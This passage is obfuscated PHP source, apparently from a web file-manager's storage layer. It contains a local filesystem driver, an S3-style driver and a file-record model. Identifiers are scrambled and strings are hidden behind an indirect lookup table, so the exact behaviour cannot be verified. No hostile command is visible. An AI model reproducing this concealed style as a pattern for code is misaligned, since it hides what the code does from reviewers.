$this->iconvTo($ÇÖìœñø, $config[$–ıæ—¡[1359]], $config[$–ıæ—¡[1358]]); } public function iconvSystem($Ñù¬®¢“) { $»ƒŒØµ =& $_SERVER[¤·²È‰º]; global $config; return $this->iconvTo($Ñù¬®¢“, $config[$»ƒŒØµ[1358]], $config[$»ƒŒØµ[1359]]); } public function getPathOuter($ÔğøÃ÷©) { $ÃÄ¾—ì– =& $_SERVER[¤·²È‰º]; $›³È¥Ï = $this->iconvApp($this->pathBase); $ÔğøÃ÷© = $this->iconvApp($ÔğøÃ÷©); if (substr($›³È¥Ï, 0, 2) == $ÃÄ¾—ì–[1361]) { $›³È¥Ï = BASIC_PATH . substr($›³È¥Ï, 2); } if (substr($ÔğøÃ÷©, 0, 2) == $ÃÄ¾—ì–[1361]) { $ÔğøÃ÷© = BASIC_PATH . substr($ÔğøÃ÷©, 2); } $›³È¥Ï = KodIO::clear($›³È¥Ï); $ÔğøÃ÷© = KodIO::clear($ÔğøÃ÷©); $ÔğøÃ÷© = substr($ÔğøÃ÷©, strlen($›³È¥Ï)); if (empty($this->pathDriver)) { return $ÔğøÃ÷©; } return $this->pathDriver . $ÃÄ¾—ì–[8] . ltrim($ÔğøÃ÷©, $ÃÄ¾—ì–[8]); } public function mkfile($¦ñÑ‹ŞÆ, $’í¤Æ¨ş = '', $ïœÅéã² = REPEAT_RENAME) { $¦ñÑ‹ŞÆ = $this->iconvSystem($¦ñÑ‹ŞÆ); @touch($¦ñÑ‹ŞÆ); if ($’í¤Æ¨ş) { file_put_contents($¦ñÑ‹ŞÆ, $’í¤Æ¨ş); } @chmod($¦ñÑ‹ŞÆ, $this->pathAuth); return is_file($¦ñÑ‹ŞÆ) ? $this->getPathOuter($¦ñÑ‹ŞÆ) : !1; } public function mkdir($á©Ï’¯Ş, $óÖ³Å÷ = REPEAT_SKIP) { $á©Ï’¯Ş = $this->iconvSystem($á©Ï’¯Ş); if (is_dir($á©Ï’¯Ş)) { return $this->getPathOuter($á©Ï’¯Ş); } @mkdir($á©Ï’¯Ş, $this->pathAuth, !0); @chmod($á©Ï’¯Ş, $this->pathAuth); return is_dir($á©Ï’¯Ş) ? $this->getPathOuter($á©Ï’¯Ş) : !1; } public function copyFile($êÖëÎ, $æïâÑàÌ) { $this->mkdir($this->pathFather($æïâÑàÌ)); $êÖëÎ = $this->iconvSystem($êÖëÎ); $æïâÑàÌ = $this->iconvSystem($æïâÑàÌ); $©Ô‡ˆÌä = copy_64($êÖëÎ, $æïâÑàÌ); @chmod($æïâÑàÌ, $this->pathAuth); return $©Ô‡ˆÌä ? $this->getPathOuter($æïâÑàÌ) : !1; } public function moveFile($ò¬‘÷ù, $ÅçÅ—öÜ) { $this->mkdir($this->pathFather($ÅçÅ—öÜ)); $ò¬‘÷ù = $this->iconvSystem($ò¬‘÷ù); $ÅçÅ—öÜ = $this->iconvSystem($ÅçÅ—öÜ); $õ—§ïæÊ = intval(@rename($ò¬‘÷ù, $ÅçÅ—öÜ)); if (!$õ—§ïæÊ) { if ($õ—§ïæÊ = intval(@copy_64($ò¬‘÷ù, $ÅçÅ—öÜ))) { @unlink($ò¬‘÷ù); } } @chmod($ÅçÅ—öÜ, $this->pathAuth); return $õ—§ïæÊ ? $this->getPathOuter($ÅçÅ—öÜ) : !1; } public function movePath($—Ë¼´ªæ, $ªÕ›ÈÂè, $—î…œƒØ = false) { $™âÂ°àö =& $_SERVER[¤·²È‰º]; $—Ë¼´ªæ = $this->iconvSystem($—Ë¼´ªæ); $ªÕ›ÈÂè = $this->iconvSystem($ªÕ›ÈÂè); $˜–÷¤İ = rtrim($ªÕ›ÈÂè, $™âÂ°àö[8]) . $™âÂ°àö[8] . ($—î…œƒØ ? $—î…œƒØ : get_path_this($—Ë¼´ªæ)); if (file_exists($˜–÷¤İ)) { return !1; } $©˜õˆ• = intval(@rename($—Ë¼´ªæ, $˜–÷¤İ)); $©˜õˆ• = file_exists($˜–÷¤İ); return $©˜õˆ• ? $this->getPathOuter($˜–÷¤İ) : !1; } public function delFile($šæª£Í) { $šæª£Í = $this->iconvSystem($šæª£Í); if (!@unlink($šæª£Í)) { @chmod($šæª£Í, $this->pathAuth); if (!@unlink($šæª£Í)) { return !1; } } else { return !0; } } public function delFolder($ŠŒÀúÏÍ) { $ÊŒœ¹õ =& $_SERVER[¤·²È‰º]; $ŠŒÀúÏÍ = $this->iconvSystem($ŠŒÀúÏÍ); if (!is_dir($ŠŒÀúÏÍ)) { return !0; } if (!($¸ÆøÕóİ = opendir($ŠŒÀúÏÍ))) { return !1; } while (($¶€è¤Şß = readdir($¸ÆøÕóİ)) !== !1) { if ($¶€è¤Şß == $ÊŒœ¹õ[10] || $¶€è¤Şß == $ÊŒœ¹õ[1368]) { continue; } $´‹ïéÀ© = $ŠŒÀúÏÍ . $ÊŒœ¹õ[8] . $¶€è¤Şß; if (is_file($´‹ïéÀ©) || is_link($´‹ïéÀ©)) { if (!unlink($´‹ïéÀ©)) { chmod($´‹ïéÀ©, $this->pathAuth); if (!unlink($´‹ïéÀ©)) { return !1; } } } else { if (is_dir($´‹ïéÀ©)) { chmod($´‹ïéÀ©, $this->pathAuth); $´‹ïéÀ© = $this->iconvApp($´‹ïéÀ©); if (!$this->delFolder($´‹ïéÀ©)) { return !1; } } } } closedir($¸ÆøÕóİ); return rmdir($ŠŒÀúÏÍ); } public function rename($ ¨ÍªŸ , $¥“ëÀàç) { $ÂéçÊ«ä =& $_SERVER[¤·²È‰º]; $‰ˆÀŸæ„ = $this->fileNameAuto($this->pathFather($ ¨ÍªŸ ), $¥“ëÀàç); $‰ˆÀŸæ„ = $this->iconvSystem($‰ˆÀŸæ„); $ ¨ÍªŸ  = $this->iconvSystem($ ¨ÍªŸ ); $ùÜŠºë = $this->pathFather($ ¨ÍªŸ ); $§æ§ú«† = rtrim($ùÜŠºë, $ÂéçÊ«ä[8]) . $ÂéçÊ«ä[8] . $‰ˆÀŸæ„; $ãëÕĞ = @rename($ ¨ÍªŸ , $§æ§ú«†); $§æ§ú«† = $this->iconvApp($§æ§ú«†); return $ãëÕĞ ? $this->getPathOuter($§æ§ú«†) : !1; } public function size($ÂŠØñ„÷) { $ÂŠØñ„÷ = $this->iconvSystem($ÂŠØñ„÷); return filesize_64($ÂŠØñ„÷); } public function info($Ëìç†ËÀ) { $Ëìç†ËÀ = $this->iconvSystem($Ëìç†ËÀ); if ($this->isFolder($Ëìç†ËÀ)) { return $this->folderInfo($Ëìç†ËÀ); } else { if ($this->isFile($Ëìç†ËÀ)) { return $this->fileInfo($Ëìç†ËÀ); } } return !1; } protected function infoChildren($´ş‡°³ù, &$Ì†ïøüô, $ Šûü¦… = true) { $ò¶æàœò =& $_SERVER[¤·²È‰º]; check_abort_echo(); $´ş‡°³ù = rtrim($´ş‡°³ù, $ò¶æàœò[8]) . $ò¶æàœò[8]; if ($ Šûü¦…) { $´ş‡°³ù = $this->iconvSystem($´ş‡°³ù); } if (!($–Î’¤§Ê = @opendir($´ş‡°³ù))) { return; } while (($ªñºôÀ = readdir($–Î’¤§Ê)) !== !1) { if ($ªñºôÀ == $ò¶æàœò[10] || $ªñºôÀ == $ò¶æàœò[1368]) { continue; } $˜Ê¦ÅÙÖ = $´ş‡°³ù . $ªñºôÀ; if (is_file($˜Ê¦ÅÙÖ) || is_link($˜Ê¦ÅÙÖ)) { $Ì†ïøüô[$ò¶æàœò[87]]++; $Ì†ïøüô[$ò¶æàœò[86]] += filesize_64($˜Ê¦ÅÙÖ); } else { if (is_dir($˜Ê¦ÅÙÖ)) { $Ì†ïøüô[$ò¶æàœò[88]]++; $this->infoChildren($˜Ê¦ÅÙÖ, $Ì†ïøüô, !1); } } } closedir($–Î’¤§Ê); } private function folderInfo($®õÊõ°§, $¿ü±”ó = false) { $åˆªß ” =& $_SERVER[¤·²È‰º]; $®õÊõ°§ = rtrim($®õÊõ°§, $åˆªß ”[8]) . $åˆªß ”[8]; $ÛšœËŸ = $this->iconvApp($this->pathThis($®õÊõ°§)); if ($¿ü±”ó) { return array($åˆªß ”[42] => $ÛšœËŸ, $åˆªß ”[94] => $this->getPathOuter($®õÊõ°§), $åˆªß ”[43] => $åˆªß ”[85]); } $¹ñ¤ñ­ = array($åˆªß ”[42] => $ÛšœËŸ, $åˆªß ”[94] => $this->getPathOuter($®õÊõ°§), $åˆªß ”[43] => $åˆªß ”[85], $åˆªß ”[210] => @filectime($®õÊõ°§), $åˆªß ”[95] => @filemtime($®õÊõ°§), $åˆªß ”[1371] => @fileatime($®õÊõ°§), $åˆªß ”[1372] => is_readable($®õÊõ°§), $åˆªß ”[1373] => is_writable($®õÊõ°§), $åˆªß ”[1374] => get_mode($®õÊõ°§)); return $¹ñ¤ñ­; } private function fileInfo($‰§î––ğ, $•»ÃÏºß = false) { $È¦’ô÷ =& $_SERVER[¤·²È‰º]; $Ã—ÔÁ± = $this->iconvApp($this->pathThis($‰§î––ğ)); if ($•»ÃÏºß) { return array($È¦’ô÷[42] => $Ã—ÔÁ±, $È¦’ô÷[94] => $this->getPathOuter($‰§î––ğ), $È¦’ô÷[43] => $È¦’ô÷[209], $È¦’ô÷[86] => $this->size($‰§î––ğ), $È¦’ô÷[184] => $this->ext($Ã—ÔÁ±)); } $¬¨ñìø = array($È¦’ô÷[42] => $Ã—ÔÁ±, $È¦’ô÷[94] => $this->getPathOuter($‰§î––ğ), $È¦’ô÷[43] => $È¦’ô÷[209], $È¦’ô÷[210] => @filectime($‰§î––ğ), $È¦’ô÷[95] => @filemtime($‰§î––ğ), $È¦’ô÷[1371] => @fileatime($‰§î––ğ), $È¦’ô÷[86] => $this->size($‰§î––ğ), $È¦’ô÷[184] => $this->ext($Ã—ÔÁ±), $È¦’ô÷[1372] => is_readable($‰§î––ğ), $È¦’ô÷[1373] => is_writable($‰§î––ğ), $È¦’ô÷[1374] => get_mode($‰§î––ğ)); return $¬¨ñìø; } public function exist($¥»ù¤éà) { $¥»ù¤éà = $this->iconvSystem($¥»ù¤éà); return @file_exists($¥»ù¤éà); } public function isFile($õı½×´) { $õı½×´ = $this->iconvSystem($õı½×´); return @is_file($õı½×´); } public function isFolder($ë“ßñû…) { $ë“ßñû… = $this->iconvSystem($ë“ßñû…); return @is_dir($ë“ßñû…); } public function listPath($Ã¿üÛîô, $±ğ™³ = false) { $áÈøÉò¿ =& $_SERVER[¤·²È‰º]; $Ã¿üÛîô = $this->iconvSystem($Ã¿üÛîô); $Ã¿üÛîô = rtrim($Ã¿üÛîô, $áÈøÉò¿[8]) . $áÈøÉò¿[8]; $ËºÈ¶ŠĞ = array($áÈøÉò¿[92] => array(), $áÈøÉò¿[93] => array()); if (!($¦× Î„‰ = @opendir($Ã¿üÛîô))) { return $ËºÈ¶ŠĞ; } while (($“ç¸º€˜ = readdir($¦× Î„‰)) !== !1) { if ($“ç¸º€˜ == $áÈøÉò¿[10] || $“ç¸º€˜ == $áÈøÉò¿[1368]) { continue; } $ÏÏ€Íô¶ = $Ã¿üÛîô . $“ç¸º€˜; if (is_file($ÏÏ€Íô¶)) { $ËºÈ¶ŠĞ[$áÈøÉò¿[93]][] = $this->fileInfo($ÏÏ€Íô¶, $±ğ™³); } else { $ËºÈ¶ŠĞ[$áÈøÉò¿[92]][] = $this->folderInfo($ÏÏ€Íô¶, $±ğ™³); } } closedir($¦× Î„‰); return $ËºÈ¶ŠĞ; } public function listAll($¡¼Îá¡€, &$ÊÃµ„ôÄ = array()) { $Â¯”Éê =& $_SERVER[¤·²È‰º]; $¡¼Îá¡€ = $this->iconvSystem($¡¼Îá¡€); $¡¼Îá¡€ = rtrim($¡¼Îá¡€, $Â¯”Éê[8]) . $Â¯”Éê[8]; if (!($™³úÃËÖ = @opendir($¡¼Îá¡€))) { return $ÊÃµ„ôÄ; } while (($®¢ó¨ôÌ = readdir($™³úÃËÖ)) !== !1) { if ($®¢ó¨ôÌ == $Â¯”Éê[10] || $®¢ó¨ôÌ == $Â¯”Éê[1368]) { continue; } $ÛûõÆÛî = $¡¼Îá¡€ . $®¢ó¨ôÌ; if (is_dir($ÛûõÆÛî) && !is_link($ÛûõÆÛî)) { $ÊÃµ„ôÄ[] = array($Â¯”Éê[94] => $ÛûõÆÛî . $Â¯”Éê[8], $Â¯”Éê[85] => 1, $Â¯”Éê[95] => @filemtime($ÛûõÆÛî), $Â¯”Éê[86] => 0); $this->listAll($ÛûõÆÛî, $ÊÃµ„ôÄ); } else { $ÊÃµ„ôÄ[] = array($Â¯”Éê[94] => $ÛûõÆÛî, $Â¯”Éê[85] => 0, $Â¯”Éê[95] => @filemtime($ÛûõÆÛî), $Â¯”Éê[86] => $this->size($ÛûõÆÛî)); } } closedir($™³úÃËÖ); return $ÊÃµ„ôÄ; } public function has($¨™Àğ£, $çÛ†œã = false, $ˆÁ¾Î£› = true) { $êÑà›äú =& $_SERVER[¤·²È‰º]; $¨™Àğ£ = $this->iconvSystem($¨™Àğ£); $¨™Àğ£ = rtrim($¨™Àğ£, $êÑà›äú[8]) . $êÑà›äú[8]; if (!($«–”­ş = @opendir($¨™Àğ£))) { return !1; } $”Ö‘’®¼ = 0; $«é­ßÃ = 0; $ö£±­å´ = 0; while (($€ŸÕ¬ãû = readdir($«–”­ş)) !== !1) { if ($€ŸÕ¬ãû == $êÑà›äú[10] || $€ŸÕ¬ãû == $êÑà›äú[1368]) { continue; } $®¡™ÑÅ = $¨™Àğ£ . $€ŸÕ¬ãû; if ($çÛ†œã) { $ö£±­å´++; if (@is_file($®¡™ÑÅ)) { $”Ö‘’®¼++; } else { $«é­ßÃ++; } if ($ö£±­å´ > 10000) { break; } continue; } if ($ˆÁ¾Î£›) { if (@is_file($®¡™ÑÅ)) { return !0; } } else { if (@is_dir($®¡™ÑÅ . $êÑà›äú[8])) { return !0; } } } closedir($«–”­ş); if ($çÛ†œã) { return array($êÑà›äú[217] => $”Ö‘’®¼, $êÑà›äú[218] => $«é­ßÃ); } return !1; } public function hashSimple($Û»áüÖ²) { $Ñ‡ï‘Ş‚ =& $_SERVER[¤·²È‰º]; if (!$Û»áüÖ²) { return md5($Ñ‡ï‘Ş‚[12]); } $Û»áüÖ² = $this->iconvSystem($Û»áüÖ²); $¢„Ñßİ§ = $this->size($Û»áüÖ²); $—í«è» = 200; $¡É“˜ = 50; if ($¢„Ñßİ§ <= $—í«è» * $¡É“˜) { return $this->hashMd5($Û»áüÖ²) . $¢„Ñßİ§; } $¦³ğ£¿ = $Ñ‡ï‘Ş‚[12]; $¿Ú³¶ñ© = intval($¢„Ñßİ§ / $¡É“˜); $æ¹âµÆ´ = fopen($Û»áüÖ², $Ñ‡ï‘Ş‚[1375]); if (!$æ¹âµÆ´) { return $¦³ğ£¿; } for ($£íèÁ«Œ = 0; $£íèÁ«Œ < $¡É“˜; $£íèÁ«Œ++) { fseek_64($æ¹âµÆ´, $¿Ú³¶ñ© * $£íèÁ«Œ); $¦³ğ£¿ .= fread($æ¹âµÆ´, $—í«è»); } fseek_64($æ¹âµÆ´, $¢„Ñßİ§ - $—í«è»); $¦³ğ£¿ .= fread($æ¹âµÆ´, $—í«è»); fclose($æ¹âµÆ´); return md5($¦³ğ£¿) . $¢„Ñßİ§; } public function getContent($â˜í¶¯Ÿ) { $â˜í¶¯Ÿ = $this->iconvSystem($â˜í¶¯Ÿ); return file_get_contents($â˜í¶¯Ÿ); } public function setContent($¡ÁÎáÜÖ, $¯¨Ø®òÃ = '') { $¡ÁÎáÜÖ = $this->iconvSystem($¡ÁÎáÜÖ); $êÃ¬Åú = @file_put_contents($¡ÁÎáÜÖ, $¯¨Ø®òÃ, LOCK_EX); clearstatcache(); @chmod($¡ÁÎáÜÖ, $this->pathAuth); return $êÃ¬Åú === !1 ? !1 : !0; } public function fileSubstr($¼®÷›•ï, $²”ºàÄì = 0, $Ù¦ÍÒğç = false) { $õú“öõÛ =& $_SERVER[¤·²È‰º]; $¼®÷›•ï = $this->iconvSystem($¼®÷›•ï); if ($Ù¦ÍÒğç === !1) { $Ù¦ÍÒğç = $this->size($¼®÷›•ï); } if ($Ù¦ÍÒğç <= 0) { return $õú“öõÛ[12]; } $¾¿ùõ”Í = fopen($¼®÷›•ï, $õú“öõÛ[1375]); if (!$¾¿ùõ”Í) { return !1; } fseek_64($¾¿ùõ”Í, $²”ºàÄì); $–Û¦„’¬ = fread($¾¿ùõ”Í, $Ù¦ÍÒğç); fclose($¾¿ùõ”Í); return $–Û¦„’¬; } public function upload($åÉçŸÜ, $¿ÖÓÕŞ², $“ŒÅï‚ğ = false, $ùÓÜ®õş = REPEAT_REPLACE) { if ($“ŒÅï‚ğ) { return $this->moveFile($¿ÖÓÕŞ², $åÉçŸÜ); } return $this->copyFile($¿ÖÓÕŞ², $åÉçŸÜ); } public function setModifyTime($û’ƒğö, $Ÿ‡‡ŸİÌ = '') { @touch($û’ƒğö, intval($Ÿ‡‡ŸİÌ)); } public function download($úœ È, $ä©ò‚Ç€) { return $this->iconvSystem($úœ È); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¸…ßõˆ¢) { parent::__construct($¸…ßõˆ¢); $this->signatureVersion($_SERVER[¤·²È‰º][226]); } public function fileOutLink($÷¡Ãå¾) { $±…Ãº« =& $_SERVER[¤·²È‰º]; if (substr($÷¡Ãå¾, 0, 7) == $±…Ãº«[1319]) { $÷¡Ãå¾ = $±…Ãº«[1320] . substr($÷¡Ãå¾, 7); } header($±…Ãº«[171] . $÷¡Ãå¾); die; } } goto a´á¡İÛøÉ; E…ŒÈ™íÛì: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\x6c\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\x65" => "\x69\x6f\x5f\x66\x69\x6c\x65\x5f\155\x65\x74\x61", "\155\145\x74\x61\106\151\145\154\144" => "\x66\151\154\145\x49\x44"); public function fileInfo($–¦ÛØˆ®) { $‡“Úœ¹ =& $_SERVER[¤·²È‰º]; static $¾‘ÄŠ = array(); if (!isset($¾‘ÄŠ[$–¦ÛØˆ®])) { $ªÈõ¨†ƒ = $‡“Úœ¹[1872]; $‘·Ó’¿ı = Model($‡“Úœ¹[479])->field($ªÈõ¨†ƒ)->where(array($‡“Úœ¹[477] => $–¦ÛØˆ®))->find(); $¾‘ÄŠ[$–¦ÛØˆ®] = $‘·Ó’¿ı; } return $¾‘ÄŠ[$–¦ÛØˆ®]; } public function addFileByContent($°ŸãĞÔÆ = '', $Ø­Óİ•” = '') { $ÙÚäÅÖ =& $_SERVER[¤·²È‰º]; $È—éÀË‘ = TEMP_PATH . $ÙÚäÅÖ[1873]; if (!is_dir($È—éÀË‘)) { mk_dir($È—éÀË‘); } $ÉçÊÜÇä = $È—éÀË‘ . $ÙÚäÅÖ[1874] . rand_string(16); file_put_contents($ÉçÊÜÇä, $°ŸãĞÔÆ); $Ú–¼¤§ = $this->addFile($ÉçÊÜÇä, $Ø­Óİ•”, !0); if (file_exists($ÉçÊÜÇä)) { @unlink($ÉçÊÜÇä); } return $Ú–¼¤§; } public function createFileName($áãõ©Ü, $Õİ“»Ø« = false, $½é‚¬€ = false) { $îæ§Ìùà =& $_SERVER[¤·²È‰º]; $¨ªÙÙ½ù = IO::init($îæ§Ìùà[8]); $ƒ½äÊá“ = $this->makeFilePath($áãõ©Ü, $¨ªÙÙ½ù, $Õİ“»Ø«, $½é‚¬€); $Ê÷·íïÕ = $¨ªÙÙ½ù->pathFather($ƒ½äÊá“); static $«ÈâüÍş = false; $ˆ –¢ï = $îæ§Ìùà[1875] . md5($Ê÷·íïÕ); if (!$«ÈâüÍş && !Cache::get($ˆ –¢ï)) { $«ÈâüÍş = !0; $µ¤½ìé¼ = IO::mkdir($Ê÷·íïÕ); if (!IO::exist($µ¤½ìé¼ . $îæ§Ìùà[798])) { IO::mkfile($µ¤½ìé¼ . $îæ§Ìùà[798]); } Cache::set($ˆ –¢ï, 1, 3600 * 2); } return $ƒ½äÊá“; } public function makeFilePath($ÇÖÏÄ¨â, $°’ğ™ë, $×›Ø…·Š = false, $ÏÁöÑÖğ = false) { $ì€ÅóË =& $_SERVER[¤·²È‰º]; $¹ı®ô•Ö = Model($ì€ÅóË[771])->get($ì€ÅóË[1876]); $ÍÚ¾¿—ó = KodIO::defaultIO() . date($ì€ÅóË[1877]); $Şüñ€…Ù = $ÍÚ¾¿—ó . rand_string(5) . short_id(100); $ÇÖÏÄ¨â = str_replace($ì€ÅóË[8], $ì€ÅóË[11], KodIO::clear($ÇÖÏÄ¨â)); $ë–œ¼²À = $°’ğ™ë->ext($ÇÖÏÄ¨â); if (!$ÇÖÏÄ¨â) { $¹ı®ô•Ö = $ì€ÅóË[1878]; } switch ($¹ı®ô•Ö) { case $ì€ÅóË[1879]: $Şüñ€…Ù = $Şüñ€…Ù . $ì€ÅóË[10] . $°’ğ™ë->ext($ÇÖÏÄ¨â); if ($ë–œ¼²À == $ì€ÅóË[1816]) { $Şüñ€…Ù .= $ì€ÅóË[1546]; } break; case $ì€ÅóË[1880]: $š¢ÀÕ¸÷ = Model($ì€ÅóË[771])->get($ì€ÅóË[772]); $¿°Àº­í = substr(md5($ì€ÅóË[773] . $š¢ÀÕ¸÷ . date($ì€ÅóË[749])), 0, 8); $ˆ°À¬ˆ‰ = KodIO::defaultDriver(); $ÍÚ¾¿—ó = $ì€ÅóË[1223] . $ˆ°À¬ˆ‰[$ì€ÅóË[407]] . $ì€ÅóË[417] . date($ì€ÅóË[1881]) . $¿°Àº­í . $ì€ÅóË[8]; if ($ë–œ¼²À == $ì€ÅóË[1816]) { $ÇÖÏÄ¨â .= $ì€ÅóË[1546]; } $›»Š…Àğ = $ì€ÅóË[1882] . $ÍÚ¾¿—ó . $ÇÖÏÄ¨â; CacheLock::lock($›»Š…Àğ); $Şüñ€…Ù = $ÍÚ¾¿—ó . $ÇÖÏÄ¨â; if (IO::exist($ÍÚ¾¿—ó . $ÇÖÏÄ¨â)) { $ßÃ­ÄâÊ = substr($ÇÖÏÄ¨â, 0, strlen($ÇÖÏÄ¨â) - strlen($ë–œ¼²À)); $¿ÜšÇŠé = $ÏÁöÑÖğ ? substr($ÏÁöÑÖğ, 0, 5) : ($×›Ø…·Š ? substr($×›Ø…·Š, 0, 5) : rand_string(5)); $Şüñ€…Ù = $ÍÚ¾¿—ó . $ßÃ­ÄâÊ . $¿ÜšÇŠé . $ì€ÅóË[10] . $ë–œ¼²À; } if (IO::isTypeObject($Şüñ€…Ù) && !IO::isUploadServer($Şüñ€…Ù)) { if (IO::exist($Şüñ€…Ù)) { return $Şüñ€…Ù; } $Ï¬ æ¿ä = IO::setContent($Şüñ€…Ù, $ì€ÅóË[12]); if (!$Ï¬ æ¿ä) { show_json($ì€ÅóË[1883], !1); } } CacheLock::unlock($›»Š…Àğ); break; case $ì€ÅóË[1878]: break; default: break; } return $Şüñ€…Ù; } public function addFileByRemote($ûêêĞ÷, $ÙÛ“Ó‹‹, $¸¼ÉîÄå = array()) { $ê¢‚Ø¤ =& $_SERVER[¤·²È‰º]; if (!IO::exist($ûêêĞ÷)) { return !1; } $™½áÍ”ñ = $¸¼ÉîÄå[$ê¢‚Ø¤[186]] ? $¸¼ÉîÄå[$ê¢‚Ø¤[186]] : $ê¢‚Ø¤[12]; $ıÂÎÎ“Ú = IO::hashMd5($ûêêĞ÷, $™½áÍ”ñ); $¼êÊû£À = KodIO::defaultDriver(); $ôù ïşÍ = array($ê¢‚Ø¤[593] => IO::size($ûêêĞ÷), $ê¢‚Ø¤[1884] => 1, $ê¢‚Ø¤[428] => $ÙÛ“Ó‹‹, $ê¢‚Ø¤[809] => $¼êÊû£À[$ê¢‚Ø¤[407]], $ê¢‚Ø¤[429] => $ûêêĞ÷, $ê¢‚Ø¤[1885] => $¸¼ÉîÄå[$ê¢‚Ø¤[187]] ? $¸¼ÉîÄå[$ê¢‚Ø¤[187]] : IO::hashSimple($ûêêĞ÷), $ê¢‚Ø¤[1886] => $ıÂÎÎ“Ú ? $ıÂÎÎ“Ú : $™½áÍ”ñ); if ($Ú·çùÁë = $this->addFileCheckExist($ôù ïşÍ[$ê¢‚Ø¤[187]], $ôù ïşÍ[$ê¢‚Ø¤[186]], $ôù ïşÍ[$ê¢‚Ø¤[86]])) { return $Ú·çùÁë; } return $this->addFileData($ôù ïşÍ); } private function addFileData($Æ¹ûÃÓ) { $†ººùÖ =& $_SERVER[¤·²È‰º]; if (!$Æ¹ûÃÓ) { return !1; } $Æ¹ûÃÓ[$†ººùÖ[86]] = intval($Æ¹ûÃÓ[$†ººùÖ[86]]); if (!$Æ¹ûÃÓ[$†ººùÖ[86]] && strlen($Æ¹ûÃÓ[$†ººùÖ[187]]) > 32) { $Æ¹ûÃÓ[$†ººùÖ[86]] = intval(substr($Æ¹ûÃÓ[$†ººùÖ[187]], 32)); } $Á€ü¢ƒƒ = $this->add($Æ¹ûÃÓ); return $this->find($Á€ü¢ƒƒ); } public function addFile($®°­¸Õ, $Œãƒèó¡, $Åä©ê¥Ñ = false) { $‡›ÆÃ°ã =& $_SERVER[¤·²È‰º]; $¤ŞÚ‡±„ = IO::hashSimple($®°­¸Õ); $„™¯Ì«  = IO::size($®°­¸Õ); $¶¾†¯ª‹ = $„™¯Ì«  <= 1024 * 1024 * 10 ? IO::hashMd5($®°­¸Õ) : $‡›ÆÃ°ã[12]; $²¬Œ”·µ = $‡›ÆÃ°ã[1887] . $¤ŞÚ‡±„; CacheLock::lock($²¬Œ”·µ); if ($¶¾†¯ª‹ && $¤ŞÚ‡±„) { $åêÏ¼Æ = $this->addFileCheckExist($¤ŞÚ‡±„, $¶¾†¯ª‹, $„™¯Ì« ); if ($åêÏ¼Æ) { CacheLock::unlock($²¬Œ”·µ); return $åêÏ¼Æ; } } $æºñãÒ° = $this->addFileMake($®°­¸Õ, $„™¯Ì« , $¤ŞÚ‡±„, $¶¾†¯ª‹, $Œãƒèó¡, $Åä©ê¥Ñ); $÷ªÄ¡ = $this->addFileData($æºñãÒ°); CacheLock::unlock($²¬Œ”·µ); if (!$¶¾†¯ª‹ && $÷ªÄ¡) { $this->fileMd5Check($÷ªÄ¡); } return $÷ªÄ¡; } private function fileMd5Check($÷Ê¡öŠŞ) { $¸¼ÂëÙ =& $_SERVER[¤·²È‰º]; $Êùé°Öë = array($÷Ê¡öŠŞ[$¸¼ÂëÙ[476]], $÷Ê¡öŠŞ[$¸¼ÂëÙ[94]]); $™àÑåÀÖ = $¸¼ÂëÙ[1888] . $÷Ê¡öŠŞ[$¸¼ÂëÙ[94]]; $´ØøÑ… = $¸¼ÂëÙ[1889] . $÷Ê¡öŠŞ[$¸¼ÂëÙ[476]]; $ÚÃ²¯õ = TaskQueue::add($¸¼ÂëÙ[1890], $Êùé°Öë, $™àÑåÀÖ, $´ØøÑ…); if (!$ÚÃ²¯õ) { $this->fileMd5Set($÷Ê¡öŠŞ[$¸¼ÂëÙ[476]], $÷Ê¡öŠŞ[$¸¼ÂëÙ[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($–ÕÊÃ›ƒ, $Ù©¬·ÊĞ) { $¦Õá»şé =& $_SERVER[¤·²È‰º]; $·÷ğ¾Âó = $this->find($–ÕÊÃ›ƒ); if (!$·÷ğ¾Âó || $·÷ğ¾Âó[$¦Õá»şé[186]]) { return; } $é¯“³Î™ = IO::hashMd5($Ù©¬·ÊĞ); if (!$é¯“³Î™) { return $¦Õá»şé[12]; } $this->where(array($¦Õá»şé[476] => $–ÕÊÃ›ƒ))->save(array($¦Õá»şé[186] => $é¯“³Î™)); } public function addFileMake($³´ü“Ûı, $œ×äüŒ¡, $Ó„¸“Ş, $åÀäó«ñ, $âìâ¤È, $¶Ö÷À¸) { $˜ÁêÖ±Ø =& $_SERVER[¤·²È‰º]; $¡± ÒÓ = $this->createFileName($âìâ¤È, $Ó„¸“Ş, $åÀäó«ñ); $šµ‚²Ş– = get_path_father($¡± ÒÓ); $’•‘»¸ƒ = get_path_this($¡± ÒÓ); if ($¶Ö÷À¸) { $Ù°Ëá†Ö = IO::move($³´ü“Ûı, $šµ‚²Ş–, !1, $’•‘»¸ƒ); } else { $Ù°Ëá†Ö = IO::copy($³´ü“Ûı, $šµ‚²Ş–, !1, $’•‘»¸ƒ); } if (!$Ù°Ëá†Ö) { return !1; } $£Ûß‰Ÿí = KodIO::defaultDriver(); $â­œì¶Æ = array($˜ÁêÖ±Ø[593] => $œ×äüŒ¡, $˜ÁêÖ±Ø[1884] => 1, $˜ÁêÖ±Ø[428] => $âìâ¤È, $˜ÁêÖ±Ø[809] => $£Ûß‰Ÿí[$˜ÁêÖ±Ø[407]], $˜ÁêÖ±Ø[429] => $¡± ÒÓ, $˜ÁêÖ±Ø[1885] => $Ó„¸“Ş, $˜ÁêÖ±Ø[1886] => $åÀäó«ñ); return $â­œì¶Æ; } public function addFileCheckExist($ÃĞ–À£Ö, $ó±Í”Ÿè, $£ ç¸¨õ) { $Ôˆä¾¡Ù =& $_SERVER[¤·²È‰º]; $ÎˆêÜÉ· = $this->findByHash($ÃĞ–À£Ö, $ó±Í”Ÿè); if (!$ÎˆêÜÉ·) { return !1; } $ıœ¹şÏú = array($Ôˆä¾¡Ù[1884] => intval($ÎˆêÜÉ·[$Ôˆä¾¡Ù[1891]]) + 1, $Ôˆä¾¡Ù[593] => $£ ç¸¨õ); $this->where(array($Ôˆä¾¡Ù[477] => $ÎˆêÜÉ·[$Ôˆä¾¡Ù[476]]))->save($ıœ¹şÏú); return $ÎˆêÜÉ·; } public function remove($çÕ¶Çş€) { $this->linkCountChange($çÕ¶Çş€, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ñª¹’Ëø) { $this->linkCountChange($Ñª¹’Ëø, !0); } public function linkCountChange($âÖ¼¢†°, 